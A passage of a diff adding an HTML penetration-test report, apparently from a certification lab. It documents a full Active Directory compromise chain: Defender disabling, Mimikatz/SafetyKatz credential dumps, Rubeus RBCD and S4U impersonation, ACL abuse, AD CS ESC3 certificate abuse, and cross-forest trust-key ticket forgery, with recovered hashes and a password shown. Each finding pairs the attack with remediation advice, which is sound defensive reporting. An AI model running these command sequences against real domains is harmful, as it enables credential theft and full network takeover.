+    </table>
+    <h3>Description</h3>
+<p>With local administrator rights as <code>studentadmin</code>, we established full
+control of STUDVM: real-time protection was disabled, the original
+<code>studentuser</code> was added to the local Administrators group for a stable
+high-integrity session, and LSASS was dumped with an evasive build of
+Mimikatz. This yielded the <strong>NTLM hash of the machine account <code>STUDVM$</code></strong>,
+which becomes the key to the delegation attack in finding F-4.</p>
+    <h3>Compromission Steps</h3>
+<p>Disable Defender real-time monitoring and grant <code>studentuser</code> local admin:</p>
+<pre><code class="language-powershell">Set-MpPreference -DisableRealtimeMonitoring $true
+net localgroup administrators TECH\studentuser /add
+</code></pre>
+<figure id="figure-4"><img alt="Defender real-time monitoring disabled" src="images/img18.png"><figcaption>Defender real-time monitoring disabled</figcaption></figure>
+<p>Dump credentials from LSASS with SafetyKatz launched through a loader:</p>
+<pre><code class="language-powershell">Loader.exe -path SafetyKatz.exe -args &quot;sekurlsa::evasive-logonpasswords&quot; &quot;exit&quot;
+</code></pre>
+<p>The machine account hash is recovered:</p>
+<pre><code class="language-text">* Username : studvm$
+* Domain   : TECH
+* NTLM     : 354cc671b0e734b885308de998576b0b
+</code></pre>
+<figure id="figure-5" class="evidence"><img alt="STUDVM$ machine-account NTLM hash recovered from LSASS" class="evidence" src="images/img20.png"><figcaption>STUDVM$ machine-account NTLM hash recovered from LSASS</figcaption></figure>
+    <h3>Recommendations</h3>
+<ul>
+<li>Deploy <strong>LAPS</strong> and <strong>Windows Defender Credential Guard</strong> to protect LSASS
+  secrets and prevent machine/domain credential reuse.</li>
+<li>Alert on <strong>Defender tamper events</strong> (real-time protection being disabled)
+  and on local-administrators group membership changes.</li>
+<li>Place high-value accounts in the <strong>Protected Users</strong> group and enforce a
+  tiered administration model.</li>
+</ul>
+    <h3>References</h3>
+    <div class="finding-references">
+      <ul>
+        <li><a href="https://attack.mitre.org/techniques/T1003/001/" target="_blank">https://attack.mitre.org/techniques/T1003/001/</a></li>
+        <li><a href="https://learn.microsoft.com/windows/security/identity-protection/credential-guard/" target="_blank">https://learn.microsoft.com/windows/security/identity-protection/credential-guard/</a></li>
+      </ul>
+    </div>
+    <pagebreak />
+  </div>
+  <div class="finding">
+    <table class="finding-header">
+      <tr><th colspan="2"><h2 id="f-3-domain-reconnaissance-attack-path-discovery" class="in-toc numbered text-center">F-3 · Domain Reconnaissance &amp; Attack-Path Discovery</h2></th></tr>
+      <tr><td class="table-key">Hostname</td><td>tech.corp (domain-wide)</td></tr>
+      <tr><td class="table-key">FQDN</td><td>tech-dc.tech.corp</td></tr>
+      <tr><td class="table-key">OS Details</td><td><p>Windows Server 2022 Datacenter (Domain Controller)</p></td></tr>
+      <tr><td class="table-key">IP Address</td><td>—</td></tr>
+    </table>
+    <h3>Description</h3>
+<p>Automated and manual enumeration built the map that drove every later
+step. adPEAS and PowerView revealed the forest trust to <code>finance.corp</code>, an
+unconstrained-delegation domain controller, <code>ms-DS-MachineAccountQuota</code>
+left at the default of 10, no LAPS anywhere in the domain, an unprotected
+Tier-0 admin (<code>techadmin</code>, RID 500), and an AD CS certificate authority
+publishing an ESC3-vulnerable template. BloodHound confirmed a short path
+to Domain Admin.</p>
+    <h3>Compromission Steps</h3>
+<p>adPEAS identifies the domain and the <strong>bidirectional, quarantined trust</strong>
+to <code>finance.corp</code>:</p>
+<pre><code class="language-text">domainNameDNS   : tech.corp
+domainSID       : S-1-5-21-1600556212-896947471-994435180
+trustPartner    : finance.corp   (Bidirectional, Transitive, QUARANTINED_DOMAIN)
+</code></pre>
+<figure id="figure-6"><img alt="Forest trust to finance.corp discovered by adPEAS" src="images/img04.png"><figcaption>Forest trust to finance.corp discovered by adPEAS</figcaption></figure>
+<p>Key weaknesses surfaced during enumeration:</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Observation</th>
+<th style="text-align: left;">Impact</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><code>ms-DS-MachineAccountQuota</code> = 10</td>
+<td style="text-align: left;">Any user can join computer accounts</td>
+</tr>
+<tr>
+<td style="text-align: left;">No LAPS (0 / 5 computers)</td>
+<td style="text-align: left;">Local admin password reuse across hosts</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>techadmin</code> (RID 500) not in Protected Users</td>
+<td style="text-align: left;">Tier-0 account exposed to theft/impersonation</td>
+</tr>
+<tr>
+<td style="text-align: left;">AD CS template <code>FIDO</code> / <code>FIDOUsers</code></td>
+<td style="text-align: left;">ESC3 enrollment-agent abuse possible</td>
+</tr>
+</tbody>
+</table>
+<p>BloodHound's shortest-path-to-Domain-Admin view:</p>
+<p><img alt="BloodHound shortest path to Domain Admin" class="evidence" src="images/img14.png">
+Session hunting and delegation checks point at the next targets:</p>
+<pre><code class="language-powershell">Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
+# adminsrv86  TECH\causer       False
+# mgmtsrv     TECH\techservice  False
+Get-DomainComputer -Unconstrained | select name, useraccountcontrol
+# tech-dc  SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
+</code></pre>
+    <h3>Recommendations</h3>
+<ul>
+<li>Lower <code>ms-DS-MachineAccountQuota</code> to <strong>0</strong> so standard users cannot create
+  computer accounts (a prerequisite for several delegation attacks).</li>
+<li>Deploy LAPS, add Tier-0 accounts to <strong>Protected Users</strong>, and review AD CS
+  template permissions (see F-8).</li>
+<li>Monitor for enumeration tooling (LDAP-heavy queries, SharpHound
+  collection patterns).</li>
+</ul>
+    <h3>References</h3>
+    <div class="finding-references">
+      <ul>
+        <li><a href="https://attack.mitre.org/techniques/T1087/002/" target="_blank">https://attack.mitre.org/techniques/T1087/002/</a></li>
+        <li><a href="https://bloodhound.readthedocs.io/" target="_blank">https://bloodhound.readthedocs.io/</a></li>
+      </ul>
+    </div>
+    <pagebreak />
+  </div>
+  <div class="finding">
+    <table class="finding-header">
+      <tr><th colspan="2"><h2 id="f-4-resource-based-constrained-delegation-rbcd-mgmtsrv" class="in-toc numbered text-center">F-4 · Resource-Based Constrained Delegation (RBCD) → MGMTSRV</h2></th></tr>
+      <tr><td class="table-key">Hostname</td><td>MGMTSRV</td></tr>
+      <tr><td class="table-key">FQDN</td><td>mgmtsrv.tech.corp</td></tr>
+      <tr><td class="table-key">OS Details</td><td><p>Windows Server (member server)</p></td></tr>
+      <tr><td class="table-key">IP Address</td><td>—</td></tr>
+    </table>
+    <h3>Description</h3>
+<p>The compromised machine account <code>STUDVM$</code> held write access over the
+<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute of <strong>MGMTSRV</strong>. This
+is the precondition for <strong>Resource-Based Constrained Delegation</strong>: by
+pointing MGMTSRV's delegation back at <code>STUDVM$</code> we could use the Kerberos
+S4U extensions to impersonate <strong>any</strong> user — including the Domain Admin
+<code>techadmin</code> — to services on MGMTSRV, giving full command execution on the
+host. Dumping the server then yielded the <code>techservice</code> account used in the
+next stage.</p>
+    <h3>Compromission Steps</h3>
+<p>Request a TGT for the machine account using its hash (Over-Pass-the-Hash):</p>
+<pre><code class="language-powershell">Rubeus.exe asktgt /user:studvm$ /rc4:354cc671b0e734b885308de998576b0b `
+  /domain:tech.corp /dc:tech-dc.tech.corp /ptt
+</code></pre>
+<p>Configure RBCD so MGMTSRV trusts <code>STUDVM$</code> to act on behalf of others:</p>
+<pre><code class="language-powershell">Set-DomainRBCD -Identity MGMTSRV -DelegateFrom &quot;STUDVM$&quot;
+</code></pre>
+<figure id="figure-7"><img alt="Configuring Resource-Based Constrained Delegation on MGMTSRV" src="images/img26.png"><figcaption>Configuring Resource-Based Constrained Delegation on MGMTSRV</figcaption></figure>
+<p>Use S4U2Self + S4U2Proxy to impersonate the Domain Admin <code>techadmin</code>:</p>
+<pre><code class="language-powershell">Rubeus.exe s4u /user:studvm$ /rc4:354cc671b0e734b885308de998576b0b `
+  /impersonateuser:techadmin /msdsspn:http/mgmtsrv.tech.corp `
+  /altservice:host,wsman,cifs,rpcss /domain:tech.corp /dc:tech-dc.tech.corp /ptt /nowrap
+</code></pre>
+<p><img alt="S4U2Self/S4U2Proxy forging a techadmin service ticket to MGMTSRV" class="evidence" src="images/img27.png">
+With the ticket injected, command execution on MGMTSRV is confirmed and the
+host's credentials are dumped, revealing the <code>techservice</code> service account:</p>
+<pre><code class="language-text">* Username : techservice
+* Domain   : TECH
+* NTLM     : 4311a88033b35fbbd00a681b005b6ead
+</code></pre>
+<figure id="figure-8"><img alt="techservice credentials recovered from MGMTSRV" src="images/img31.png"><figcaption>techservice credentials recovered from MGMTSRV</figcaption></figure>
+    <h3>Recommendations</h3>
+<ul>
+<li>Audit and remove write access to <strong><code>msDS-AllowedToActOnBehalfOfOtherIdentity</code></strong>
+  for non-administrative principals; no standard machine account should be
+  able to configure delegation on another host.</li>
+<li>Set <code>ms-DS-MachineAccountQuota</code> to 0 and mark Tier-0 accounts as
+  <strong>sensitive and cannot be delegated</strong>.</li>
+<li>Monitor Event ID 4769 for S4U ticket requests referencing privileged
+  users.</li>
+</ul>
+    <h3>References</h3>
+    <div class="finding-references">
+      <ul>
+        <li><a href="https://attack.mitre.org/techniques/T1558/003/" target="_blank">https://attack.mitre.org/techniques/T1558/003/</a></li>
+        <li><a href="https://learn.microsoft.com/windows-server/security/kerberos/kerberos-constrained-delegation-overview" target="_blank">https://learn.microsoft.com/windows-server/security/kerberos/kerberos-constrained-delegation-overview</a></li>
+      </ul>
+    </div>
+    <pagebreak />
+  </div>
+  <div class="finding">
+    <table class="finding-header">
+      <tr><th colspan="2"><h2 id="f-5-active-directory-acl-abuse-addself-force-change-password" class="in-toc numbered text-center">F-5 · Active Directory ACL Abuse — AddSelf &amp; Force-Change-Password</h2></th></tr>
+      <tr><td class="table-key">Hostname</td><td>tech.corp (Directory ACLs)</td></tr>
+      <tr><td class="table-key">FQDN</td><td>tech-dc.tech.corp</td></tr>
+      <tr><td class="table-key">OS Details</td><td><p>Active Directory object permissions</p></td></tr>
+      <tr><td class="table-key">IP Address</td><td>—</td></tr>
+    </table>
+    <h3>Description</h3>
+<p>The <code>techservice</code> account recovered from MGMTSRV held a dangerous ACL
+chain. It could <strong>add itself</strong> to the privileged <code>Management</code> group
+(a <code>Self</code>/<code>Self-Membership</code> right), and the <code>Management</code> group in turn held
+<strong><code>User-Force-Change-Password</code></strong> over the user <code>puretech</code>. By walking this
+chain we reset <code>puretech</code>'s password without knowing its current value —
+a pure permissions abuse that requires no cracking.</p>
+    <h3>Compromission Steps</h3>
+<p>Enumerate what <code>techservice</code> can do, and the group's rights over <code>puretech</code>:</p>
+<pre><code class="language-powershell"># techservice -&gt; Management (Self-Membership)
+# Management  -&gt; puretech    (User-Force-Change-Password)
+</code></pre>
+<figure id="figure-9"><img alt="Management group holds Force-Change-Password over puretech" src="images/img35.png"><figcaption>Management group holds Force-Change-Password over puretech</figcaption></figure>
+<p>Add <code>techservice</code> into the <code>Management</code> group, then reset <code>puretech</code>:</p>
+<pre><code class="language-powershell">Add-DomainGroupMember -Identity &quot;Management&quot; -Members &quot;techservice&quot; -Domain tech.corp -Verbose
+# VERBOSE: [Add-DomainGroupMember] Adding member 'techservice' to group 'Management'
+</code></pre>
+<figure id="figure-10"><img alt="Self-adding techservice into the privileged Management group" src="images/img39.png"><figcaption>Self-adding techservice into the privileged Management group</figcaption></figure>
+<pre><code class="language-powershell">Set-DomainUserPassword -Identity puretech -AccountPassword $pass -Verbose
+# VERBOSE: [Set-DomainUserPassword] Password for user 'puretech' successfully reset
+</code></pre>
+<figure id="figure-11"><img alt="Force-resetting the puretech account password" src="images/img42.png"><figcaption>Force-resetting the puretech account password</figcaption></figure>
+<p>A logon as <code>puretech</code> is then obtained, giving a fresh identity to pivot
+with:</p>
+<figure id="figure-12"><img alt="Interactive session as puretech" src="images/img44.png"><figcaption>Interactive session as puretech</figcaption></figure>
+    <h3>Recommendations</h3>
+<ul>
+<li>Remove the <strong>Self-Membership</strong> ACE that lets <code>techservice</code> add itself to
+  <code>Management</code>, and the <strong>User-Force-Change-Password</strong> right the group holds
+  over <code>puretech</code>; grant such rights only to dedicated, monitored admin
+  roles.</li>
+<li>Run regular ACL reviews (BloodHound / <code>Get-DomainObjectAcl</code>) to catch
+  privilege-granting ACEs on users and groups.</li>
+<li>Alert on Event ID 4724/4738 (password reset / account change) for
+  sensitive accounts.</li>
+</ul>
+    <h3>References</h3>
+    <div class="finding-references">
+      <ul>
+        <li><a href="https://attack.mitre.org/techniques/T1098/" target="_blank">https://attack.mitre.org/techniques/T1098/</a></li>
+        <li><a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html" target="_blank">https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html</a></li>
+      </ul>
+    </div>
+    <pagebreak />
+  </div>
+  <div class="finding">
+    <table class="finding-header">
+      <tr><th colspan="2"><h2 id="f-6-lateral-movement-to-techsrv30-local-secret-extraction" class="in-toc numbered text-center">F-6 · Lateral Movement to TECHSRV30 &amp; Local Secret Extraction</h2></th></tr>
+      <tr><td class="table-key">Hostname</td><td>TECHSRV30</td></tr>
+      <tr><td class="table-key">FQDN</td><td>techsrv30.tech.corp</td></tr>
+      <tr><td class="table-key">OS Details</td><td><p>Windows Server (member server)</p></td></tr>
+      <tr><td class="table-key">IP Address</td><td>—</td></tr>
+    </table>
+    <h3>Description</h3>
+<p><code>puretech</code> (via <code>pureadmin</code>) held local administrator rights on
+<strong>TECHSRV30</strong>. After relaying tooling to the host through a port-proxy, the
+SAM and cached secrets were extracted with an evasive Mimikatz build. This
+exposed the local administrator <code>securetech</code> and the machine account
+<code>TECHSRV30$</code> — the latter being a member of the custom <code>srvusers</code> group that
+matters for the certificate attack in F-8.</p>
+    <h3>Compromission Steps</h3>
+<p>Relay the loader to TECHSRV30 via a port-proxy and dump the machine account:</p>
+<pre><code class="language-powershell">netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 `
+  connectport=80 connectaddress=172.16.100.10
+</code></pre>
+<pre><code class="language-text">* Username : techsrv30$
+* Domain   : TECH
+* NTLM     : 04b37fd7d28ab7c9b3cbe36336d19581
+</code></pre>
+<p>Elevate to SYSTEM and dump the SAM to recover the local administrator
+<code>securetech</code> (RID 500):</p>
+<pre><code class="language-text">C:\Temp\sk.exe &quot;token::elevate&quot; &quot;lsadump::evasive-sam&quot; &quot;exit&quot;
+
+RID  : 000001f4 (500)
+User : securetech
+Hash NTLM: abbd00c18b8ff34770238a08e98f4932
+</code></pre>
+<figure id="figure-13" class="evidence"><img alt="SAM dump on TECHSRV30 exposing the local admin securetech" class="evidence" src="images/img51.png"><figcaption>SAM dump on TECHSRV30 exposing the local admin securetech</figcaption></figure>
+    <h3>Recommendations</h3>
+<ul>
+<li>Deploy <strong>LAPS</strong> to eliminate shared local-administrator passwords across
+  member servers.</li>
+<li>Restrict who holds local administrator rights on application servers;
+  apply the tiered administration model.</li>
+<li>Enable <strong>Credential Guard</strong> and monitor for SAM/LSA dumping (Event ID
+  4688 with suspicious process lineage).</li>
+</ul>
+    <h3>References</h3>
+    <div class="finding-references">
+      <ul>
+        <li><a href="https://attack.mitre.org/techniques/T1003/002/" target="_blank">https://attack.mitre.org/techniques/T1003/002/</a></li>
+        <li><a href="https://attack.mitre.org/techniques/T1021/" target="_blank">https://attack.mitre.org/techniques/T1021/</a></li>
+      </ul>
+    </div>
+    <pagebreak />
+  </div>
+  <div class="finding">
+    <table class="finding-header">
+      <tr><th colspan="2"><h2 id="f-7-lsa-secrets-harvest-causer-adminsrv86" class="in-toc numbered text-center">F-7 · LSA Secrets Harvest — `causer` &amp; ADMINSRV86</h2></th></tr>
+      <tr><td class="table-key">Hostname</td><td>ADMINSRV86</td></tr>
+      <tr><td class="table-key">FQDN</td><td>adminsrv86.tech.corp</td></tr>
+      <tr><td class="table-key">OS Details</td><td><p>Windows Server (member server)</p></td></tr>
+      <tr><td class="table-key">IP Address</td><td>—</td></tr>
+    </table>
+    <h3>Description</h3>
+<p>Extraction of LSA secrets exposed the password for the <strong><code>causer</code></strong> account,
+stored as a service credential under the <code>SNMPTRAP</code> secret, along with the
+<code>ADMINSRV86$</code> machine account. The <code>causer</code> account is significant because
+it holds the certificate-enrollment rights abused in F-8 — this finding is
+the bridge from credential theft to the AD CS escalation.</p>
+    <h3>Compromission Steps</h3>
+<p>Dump LSA secrets and recover the <code>causer</code> service password in cleartext:</p>
+<pre><code class="language-text">Secret : _SC_SNMPTRAP / service 'SNMPTRAP' with username : causer@tech.corp
+cur/text: Ca@8170734525364357
+</code></pre>
+<p><img alt="causer password recovered from the SNMPTRAP LSA secret" class="evidence" src="images/img56.png">
+The <code>ADMINSRV86$</code> machine account is also recovered:</p>
+<pre><code class="language-text">* Username : adminsrv86$
+* Domain   : TECH
+* NTLM     : 390d9db95b492e45c4e43b85d2b9c432
+</code></pre>
+    <h3>Recommendations</h3>
+<ul>
+<li>Avoid running services under domain user accounts with static passwords;
+  migrate <code>SNMPTRAP</code> and similar services to <strong>gMSA</strong>.</li>
+<li>Restrict local administrator access so LSA secrets cannot be read, and
+  enable <strong>Credential Guard</strong>.</li>
+<li>Rotate the <code>causer</code> password and review its certificate-enrollment rights
+  (see F-8).</li>
+</ul>
+    <h3>References</h3>
+    <div class="finding-references">
+      <ul>
+        <li><a href="https://attack.mitre.org/techniques/T1003/004/" target="_blank">https://attack.mitre.org/techniques/T1003/004/</a></li>
+        <li><a href="https://learn.microsoft.com/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview" target="_blank">https://learn.microsoft.com/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview</a></li>
+      </ul>
+    </div>
+    <pagebreak />
+  </div>
+  <div class="finding">
+    <table class="finding-header">
+      <tr><th colspan="2"><h2 id="f-8-ad-cs-esc3-enrollment-agent-abuse-to-domain-admin" class="in-toc numbered text-center">F-8 · AD CS ESC3 — Enrollment-Agent Abuse to Domain Admin</h2></th></tr>
+      <tr><td class="table-key">Hostname</td><td>TECH-DC (tech-tech-dc-CA)</td></tr>
+      <tr><td class="table-key">FQDN</td><td>tech-dc.tech.corp</td></tr>
+      <tr><td class="table-key">OS Details</td><td><p>Windows Server 2022 — Active Directory Certificate Services</p></td></tr>
+      <tr><td class="table-key">IP Address</td><td>—</td></tr>
+    </table>
+    <h3>Description</h3>
+<p>The certificate authority <code>tech-tech-dc-CA</code> published a template (<code>FIDO</code>)
+whose Extended Key Usage included <strong>Certificate Request Agent</strong> and which
+<code>causer</code> was permitted to enrol in — the classic <strong>ESC3</strong> misconfiguration.
+An enrollment-agent certificate can request certificates <em>on behalf of</em> any
+other user. We used it to enrol a certificate for the Domain Admin
+<strong><code>techadmin</code></strong> via the <code>FIDOUsers</code> template, then used that certificate to
+authenticate with <strong>PKINIT</strong> and obtain a Domain Admin TGT — a full domain
+takeover driven entirely by the PKI.</p>
+    <h3>Compromission Steps</h3>
+<p>As <code>causer</code>, request the enrollment-agent certificate from the <code>FIDO</code>
+template and convert it to PFX:</p>
+<pre><code class="language-powershell">.\Certify.exe request /ca:tech-dc.tech.corp\tech-tech-dc-CA /template:FIDO
+.\openssl\openssl.exe pkcs12 -in .\esc3agent.pem -keyex `
+  -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out .\esc3agent.pfx
+</code></pre>
+<figure id="figure-14"><img alt="Requesting the FIDO enrollment-agent certificate as causer" src="images/img60.png"><figcaption>Requesting the FIDO enrollment-agent certificate as causer</figcaption></figure>
+<p>Use the agent certificate to request a certificate <strong>on behalf of</strong>
+<code>techadmin</code> from the <code>FIDOUsers</code> template:</p>
+<pre><code class="language-powershell">.\Certify.exe request /ca:tech-dc.tech.corp\tech-tech-dc-CA /template:FIDOUsers `
+  /onbehalfof:TECH\techadmin /enrollcert:.\esc3agent.pfx /enrollcertpw:123456
+# [*] CA Response : The certificate had been issued.
+</code></pre>
+<p><img alt="On-behalf-of certificate issued for the Domain Admin techadmin" class="evidence" src="images/img62.png">
+Convert the <code>techadmin</code> certificate and authenticate via PKINIT to receive a
+<strong>Domain Admin TGT</strong>:</p>
+<pre><code class="language-powershell">.\openssl\openssl.exe pkcs12 -in .\esc3DA.pem -keyex `
+  -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out .\esc3DA.pfx
+.\Rubeus.exe asktgt /user:techadmin /certificate:.\esc3DA.pfx /password:123456 `
+  /domain:tech.corp /dc:tech-dc.tech.corp /ptt /nowrap
+# UserName : techadmin (NT_PRINCIPAL)   -&gt;  ticket for krbtgt/tech.corp
+</code></pre>
+<figure id="figure-15" class="evidence"><img alt="Domain Admin (techadmin) TGT obtained via PKINIT" class="evidence" src="images/img64.png"><figcaption>Domain Admin (techadmin) TGT obtained via PKINIT</figcaption></figure>
+    <h3>Recommendations</h3>
+<ul>
+<li>Remove the <strong>Certificate Request Agent</strong> EKU from the <code>FIDO</code> template, or
+  restrict enrollment to a small, trusted group and require <strong>CA manager
+  approval</strong> for issuance.</li>
+<li>Restrict the <code>FIDOUsers</code> template so enrollment agents cannot request on
+  behalf of Tier-0 accounts; enable the <strong>enrollment-agent restrictions</strong>
+  on the CA.</li>
+<li>Monitor for <code>Certify</code>/certificate-request activity and PKINIT logons for
+  privileged users.</li>
+</ul>
+    <h3>References</h3>
+    <div class="finding-references">
+      <ul>
+        <li><a href="https://attack.mitre.org/techniques/T1649/" target="_blank">https://attack.mitre.org/techniques/T1649/</a></li>
+        <li><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2" target="_blank">https://posts.specterops.io/certified-pre-owned-d95910965cd2</a></li>
+      </ul>
+    </div>
+    <pagebreak />
+  </div>
+  <div class="finding">
+    <table class="finding-header">
+      <tr><th colspan="2"><h2 id="f-9-cross-forest-compromise-trust-key-forgery-into-finance-corp" class="in-toc numbered text-center">F-9 · Cross-Forest Compromise — Trust-Key Forgery into finance.corp</h2></th></tr>
+      <tr><td class="table-key">Hostname</td><td>FINANCE-DC</td></tr>
+      <tr><td class="table-key">FQDN</td><td>finance-dc.finance.corp</td></tr>
+      <tr><td class="table-key">OS Details</td><td><p>Windows Server 2022 (finance.corp Domain Controller)</p></td></tr>
+      <tr><td class="table-key">IP Address</td><td>172.16.3.4</td></tr>
+    </table>
+    <h3>Description</h3>
+<p>With Domain Admin in <code>tech.corp</code> we extracted the <strong>inter-realm trust key</strong>
+for the <code>tech.corp ⇄ finance.corp</code> trust. Because the trust key lets us
+forge an inter-realm TGT that presents as a <em>native</em> <code>finance.corp</code>
+principal, we impersonated the built-in administrator <strong><code>finadmin</code></strong>
+(RID 500) and crossed into <code>finance.corp</code>. From there we reached a
+cross-forest file share, stole an <strong>unencrypted private key</strong> exposed on it,
+converted it to a certificate, authenticated with PKINIT, and read the final
+objective flag on the <code>finance.corp</code> domain controller.</p>
+<blockquote>
+<p><strong>Note on SID filtering.</strong> The trust is marked <code>QUARANTINED_DOMAIN</code>, so a
+naïve Golden Ticket that injects a foreign <em>Enterprise Admins</em> SID
+(RID 519) via SID history is <strong>filtered and rejected</strong> — SID filtering
+working as designed. The successful approach instead forges an inter-realm
+TGT with the <strong>trust key</strong> and impersonates a <em>native</em> <code>finance.corp</code>
+account (RID 500), which is not stripped by the outbound filter.</p>
+</blockquote>
+    <h3>Compromission Steps</h3>
+<p><strong>Trust-key extraction (as Domain Admin, on TECH-DC).</strong> DCSync the trust
+keys and the <code>krbtgt</code> hash:</p>
+<pre><code class="language-powershell">Loader.exe -path SafetyKatz.exe -args &quot;lsadump::evasive-trust /patch&quot; &quot;exit&quot;
+</code></pre>
+<pre><code class="language-text">[ In ] TECH.CORP -&gt; FINANCE.CORP
+  rc4_hmac_nt   a0ba8caa534fc2f186ca86ea7b5cee6e     &lt;-- inter-realm trust key
+</code></pre>
+<p><img alt="Inter-realm trust keys extracted via DCSync" class="evidence" src="images/img67.png">
+<strong>Attempted approach (blocked by SID filtering).</strong> A cross-forest Golden
+Ticket using the <code>tech\krbtgt</code> hash with SID history for <code>finance.corp</code>
+Enterprise Admins (RID 519) was rejected by the quarantined trust:</p>
+<pre><code class="language-powershell"># Superseded — foreign RID 519 stripped by SID filtering on the trust
+.\SafetyKatz.exe &quot;kerberos::golden /user:administrator /domain:tech.corp `
+  /sid:S-1-5-21-1600556212-896947471-994435180 `
+  /sids:S-1-5-21-3132463012-610816204-3671931044-519 `
+  /rc4:2e1b94e534db024815fdb30273174dc6 /service:krbtgt /target:finance.corp `
+  /ticket:finance.kirbi&quot; &quot;exit&quot;
+</code></pre>
+<p><strong>Working approach — forge an inter-realm TGT with the trust key</strong>,
+impersonating the native <code>finance.corp</code> administrator <code>finadmin</code> (RID 500):</p>
+<pre><code class="language-powershell">.\mimikatz.exe &quot;kerberos::golden /user:finadmin /domain:tech.corp `
+  /sid:S-1-5-21-1600556212-896947471-994435180 `
+  /sids:S-1-5-21-3132463012-610816204-3671931044-500 `
+  /rc4:a0ba8caa534fc2f186ca86ea7b5cee6e /service:krbtgt /target:finance.corp `
+  /ticket:finadmin_in.kirbi&quot; exit
+</code></pre>
+<p>Exchange the referral ticket for a CIFS service ticket to FINANCE-DC:</p>
+<pre><code class="language-powershell">.\Rubeus.exe asktgs /ticket:finadmin_in.kirbi `
+  /service:cifs/finance-dc.finance.corp /dc:172.16.3.4 /ptt /nowrap
+</code></pre>
+<p><img alt="Inter-realm TGT forged for finadmin and exchanged for a CIFS ticket" class="evidence" src="images/img69.png">
+Access the cross-forest share — it exposes an <strong>unencrypted</strong> private key
+<code>finadmin.pem</code>. The <code>openssl</code> conversion only prompts for an <em>export</em>
+password (the one being set), never an <em>import</em> password, proving the PEM
+held an unprotected private key:</p>
+<pre><code class="language-powershell">dir \\finance-dc.finance.corp\TechOperations
+#  finadmin.pem   3,988 bytes
+copy \\finance-dc.finance.corp\TechOperations\finadmin.pem `
+  C:\Users\studentuser\Desktop\shared\finadmin.pem
+.\openssl\openssl.exe pkcs12 -in .\finadmin.pem -keyex `
+  -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out finadmin.pfx
+# Enter Export Password:  &lt;-- only an EXPORT prompt: the PEM key was unencrypted
+</code></pre>
+<p><img alt="Unencrypted finadmin.pem stolen from the cross-forest share and converted" class="evidence" src="images/img71.png">
+Authenticate as <code>finadmin</code> with <strong>PKINIT</strong>, spawning a fresh logon session
+via <code>/createnetonly</code> and injecting the TGT into it:</p>
+<pre><code class="language-powershell">.\Rubeus.exe asktgt /user:finadmin /certificate:.\finadmin.pfx /password:&lt;pfx-password&gt; `
+  /domain:finance.corp /dc:finance-dc.finance.corp `
+  /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+</code></pre>
+<p>Verify the ticket, confirm remote access, and read the <strong>final flag</strong>
+locally on FINANCE-DC:</p>
+<pre><code class="language-powershell">klist
+#  Client: finadmin @ FINANCE.CORP
+dir \\finance-dc.finance.corp\C$
+winrs -r:finance-dc.finance.corp &quot;whoami &amp;&amp; hostname&quot;
+#  finance\finadmin
+#  finance-dc
+</code></pre>
+<figure id="figure-16" class="evidence"><img alt="PKINIT TGT verified and OS command execution on FINANCE-DC as finadmin" class="evidence" src="images/img73.png"><figcaption>PKINIT TGT verified and OS command execution on FINANCE-DC as finadmin</figcaption></figure>
+<pre><code class="language-text">winrs -r:finance-dc.finance.corp cmd
+C:\Users\finadmin&gt; cd Desktop
+C:\Users\finadmin\Desktop&gt; type finalflag.txt
+64061b82-fb44-48d5-b2d2-761766634e30
+</code></pre>
+<figure id="figure-17" class="evidence"><img alt="Final objective flag read on FINANCE-DC as finadmin" class="evidence" src="images/img74.png"><figcaption>Final objective flag read on FINANCE-DC as finadmin</figcaption></figure>
+    <h3>Recommendations</h3>
+<ul>
+<li><strong>Enforce SID filtering / selective authentication</strong> on the <code>finance.corp</code>
+  trust in <em>both</em> directions so that forged inter-realm tickets — even those
+  impersonating native RID 500 accounts — cannot cross the boundary.</li>
+<li>Treat the <strong>forest</strong>, not the domain, as the security boundary; keep
+  highly sensitive assets in a separate, tightly-trusted forest.</li>
+<li><strong>Never store unencrypted private keys</strong> on file shares; the exposed
+  <code>finadmin.pem</code> gave a direct certificate-based logon. Protect private keys
+  with strong passphrases and restrictive ACLs.</li>
+<li>Rotate the <strong><code>krbtgt</code></strong> account (twice) and the <strong>inter-realm trust key</strong>;
+  monitor for anomalous inter-realm TGS requests.</li>
+</ul>
+    <h3>References</h3>
+    <div class="finding-references">
+      <ul>
+        <li><a href="https://attack.mitre.org/techniques/T1134/005/" target="_blank">https://attack.mitre.org/techniques/T1134/005/</a></li>
+        <li><a href="https://attack.mitre.org/techniques/T1649/" target="_blank">https://attack.mitre.org/techniques/T1649/</a></li>
+        <li><a href="https://learn.microsoft.com/windows-server/identity/ad-ds/manage/understand-security-identifiers" target="_blank">https://learn.microsoft.com/windows-server/identity/ad-ds/manage/understand-security-identifiers</a></li>
+      </ul>
+    </div>
+    <pagebreak />
+  </div>
+</section>
+<section class="disclaimer">
+  <h1 id="disclaimer" class="in-toc numbered">Disclaimer</h1>
+<p>This report reflects a point-in-time assessment of the target environment
+during the examination window and does not guarantee that every weakness
+present was identified. The absence of a finding for a given system or
+control should not be interpreted as evidence that no weakness exists.</p>
+<p>All testing was performed against a dedicated lab environment provided for
+training and certification purposes. The techniques described are documented
+to enable the defender to reproduce, understand and remediate the underlying
+misconfigurations. This document is <strong>CONFIDENTIAL</strong>.</p>
+</section>
+<pagebreak />
+<section class="appendix">
+  <h1 id="appendix" class="in-toc numbered">Appendix</h1>
+  <h2 id="compromised-credentials-secrets" class="in-toc numbered">Compromised Credentials &amp; Secrets</h2>
+<p>The following secrets were recovered during the assessment. All are from
+the isolated exam lab and are reproduced here as proof of compromise.</p>
+<table>
+<thead>
+<tr>
